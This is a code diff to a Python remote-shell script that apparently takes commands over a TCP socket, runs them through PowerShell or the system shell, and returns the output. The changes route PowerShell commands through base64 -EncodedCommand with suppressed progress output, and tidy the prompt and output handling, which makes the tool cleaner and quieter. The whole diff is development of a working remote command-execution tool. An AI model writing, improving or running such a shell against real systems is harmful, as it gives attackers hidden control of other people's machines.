@@ -13,20 +13,27 @@ def encode_powershell_command(cmd: str) -> str:
     cmd_bytes = cmd.encode('utf-16le')
     return base64.b64encode(cmd_bytes).decode('ascii')
 
+def run_powershell_command(command: str, cwd: str) -> str:
+    # Suppress progress, set output encoding, force plain text output with Out-String -Stream
+    ps_command = (
+        "$ProgressPreference = 'SilentlyContinue';"
+        "$OutputEncoding = [Console]::OutputEncoding = [Text.Encoding]::UTF8;"
+        f"{command} | Out-String -Stream"
+    )
+    encoded_cmd = encode_powershell_command(ps_command)
+    output = subprocess.check_output(
+        ["powershell.exe", "-NoProfile", "-EncodedCommand", encoded_cmd],
+        stderr=subprocess.STDOUT,
+        text=True,
+        cwd=cwd
+    )
+    return output.strip()
+
 def get_prompt():
     global cwd
     if mode == "ps":
-        try:
-            prompt_path = subprocess.check_output(
-                ["powershell.exe", "-NoProfile", "-Command", "Get-Location"],
-                stderr=subprocess.STDOUT,
-                text=True,
-                cwd=cwd
-            ).strip()
-            cwd = prompt_path
-            return f"{prompt_path}> "
-        except Exception:
-            return f"{cwd}> "
+        # Just return cwd stored locally as prompt, no call to Get-Location
+        return f"{cwd}> "
     else:
         try:
             prompt_path = subprocess.check_output(
@@ -76,15 +83,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.sendall(prompt.encode())
                 continue
 
-            # Run command in tracked directory
             if mode == "ps":
-                encoded_cmd = encode_powershell_command(command)
-                output = subprocess.check_output(
-                    ["powershell.exe", "-NoProfile", "-EncodedCommand", encoded_cmd],
-                    stderr=subprocess.STDOUT,
-                    text=True,
-                    cwd=cwd
-                )
+                output = run_powershell_command(command, cwd)
             else:
                 output = subprocess.check_output(
                     command,
@@ -92,16 +92,15 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     stderr=subprocess.STDOUT,
                     text=True,
                     cwd=cwd
-                )
+                ).strip()
 
             prompt = get_prompt()
-
-            # Send prompt and output separately so no duplicate command echoes:
+            # Send prompt and output separated by newline (no duplicate echo)
             full_output = f"{prompt}\n{output}"
 
         except subprocess.CalledProcessError as e:
             prompt = get_prompt()
-            full_output = f"{prompt}\n{e.output}"
+            full_output = f"{prompt}\n{e.output.strip()}"
         except FileNotFoundError as e:
             prompt = get_prompt()
             full_output = f"{prompt}\n{str(e)}"
